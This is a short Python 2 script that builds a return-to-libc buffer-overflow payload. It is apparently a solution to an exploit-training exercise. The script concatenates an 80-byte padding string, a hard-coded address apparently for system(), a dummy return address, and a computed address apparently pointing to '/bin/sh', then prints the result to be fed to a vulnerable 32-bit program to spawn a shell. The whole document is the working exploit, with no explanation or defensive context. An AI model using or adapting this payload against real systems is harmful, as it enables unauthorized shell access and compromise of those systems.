import struct

buffer = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'
system = struct.pack("I", 0xb7ecffb0)
sys_ret = 'AAAA'
bin_sh = struct.pack("I", 0xb7e97000 + 0x11f3bf)
padding = buffer + system + sys_ret + bin_sh
print padding
